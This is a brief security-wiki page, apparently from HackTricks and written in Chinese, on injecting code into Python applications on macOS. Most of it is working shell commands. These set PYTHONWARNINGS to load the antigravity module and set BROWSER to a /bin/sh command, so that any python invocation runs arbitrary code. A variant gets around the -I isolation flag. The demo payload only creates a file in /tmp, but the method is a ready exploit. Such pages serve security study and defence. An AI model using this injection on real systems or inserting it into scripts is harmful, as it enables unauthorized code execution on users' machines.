# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PYTHONWARNINGS` 和 `BROWSER` 环境变量

可以修改这两个环境变量，以便在每次调用 python 时执行任意代码，例如：<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## 参考资料

- [1] [使用环境变量进行 Hacking - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
